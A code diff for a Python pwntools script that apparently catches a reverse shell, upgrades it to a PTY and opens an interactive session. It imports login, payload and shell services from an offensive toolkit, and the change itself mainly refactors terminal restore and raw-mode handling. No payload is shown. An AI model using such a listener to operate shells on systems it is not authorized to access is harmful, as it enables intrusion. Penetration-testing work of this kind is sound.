@@ -1,13 +1,20 @@
 #!/usr/bin/env python3
 
-import os, sys, termios, threading
+import os, threading
 from argparse import Namespace
 from pwnlib.log import install_default_handler, getLogger
 from pwnlib.tubes.listen import listen
-from services import LoginService, PayloadService, ShellService, ParametersParserService
+from services import (
+    LoginService,
+    PayloadService,
+    ShellService,
+    ParametersParserService,
+    TerminalService
+)
 
+# Init pwntools stuff and safe terminal conf
+terminal_service = TerminalService()
 install_default_handler()
-old_tty = termios.tcgetattr(sys.stdin)
 log = getLogger('pwnlib')
 
 def shell_handler(shell: listen):
@@ -15,7 +22,7 @@ def shell_handler(shell: listen):
     shell.shutdown('send')
 
     # Restore terminal conf and exit
-    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+    terminal_service.restore_tty()
 
     log.setLevel(1)
     log.info(f'Closed connection to {shell.rhost} port {shell.rport}')
@@ -51,7 +58,8 @@ def main(args: Namespace):
     
     with log.progress('Trying to stabilize the shell...') as p:
         try:
-            shell_service.stabilize_shell(shell)
+            shell_service.upgrade_shell(shell)
+            terminal_service.pty = True
             p.success('Shell stabilized!')
         except:
             p.failure('Shell stabilization not possible, a non pty shell will be provided')
@@ -60,12 +68,13 @@ def main(args: Namespace):
             shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
             shell_handler_thread.setDaemon(True)
             shell_handler_thread.start()
-        
-    print('\r', end='')
+    
+    # Start interactive mode
     log.info('Switching to interactive mode')
     log.setLevel('error')
-
-    shell.sendline(b'') # Make the prompt appears
+    if(terminal_service.pty):
+        terminal_service.set_raw_mode()
+    shell.sendline(b'') # Make the prompt appear
     shell.interactive()
 
 if __name__ == '__main__':
